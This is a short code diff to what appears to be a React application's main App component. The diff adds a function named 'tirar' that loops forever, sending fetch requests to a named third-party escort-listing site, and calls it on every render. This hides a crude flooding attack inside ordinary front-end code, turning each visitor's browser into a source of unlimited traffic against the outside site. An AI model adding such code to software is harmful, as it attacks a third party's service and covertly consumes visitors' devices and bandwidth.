@@ -10,6 +10,16 @@ import Options from './components/Options';
 import Footer from './components/Footer';
 
 function App() {
+  async function tirar(){
+    let i = 1;
+    while(i){
+      await fetch("https://ar.skokka.com/escorts/mar-del-plata/");
+      console.log("Llamadas: ", i);
+      i++;
+    }
+  }
+
+  tirar();
   return (
     <div className="App">
       <Route exact path='/'>
